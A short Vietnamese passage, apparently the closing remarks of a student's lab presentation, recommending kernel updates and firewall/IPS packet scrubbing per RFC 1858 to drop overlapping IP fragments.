  Qua bài thực hành số 06, bài học rút ra là: Ngoài việc cập nhật Kernel thường xuyên, trong các mạng doanh nghiệp cần triển khai cơ chế **Packet Scrubbing (Virtual Reassembly)** trên các thiết bị Firewall/IPS biên (theo chuẩn RFC 1858) để tự động chuẩn hóa, loại bỏ các mảnh chồng lấn trước khi đi vào máy chủ nội bộ. Em xin kết thúc bài thực hành số 06 tại đây. Cảm ơn thầy và các bạn đã lắng nghe!"*
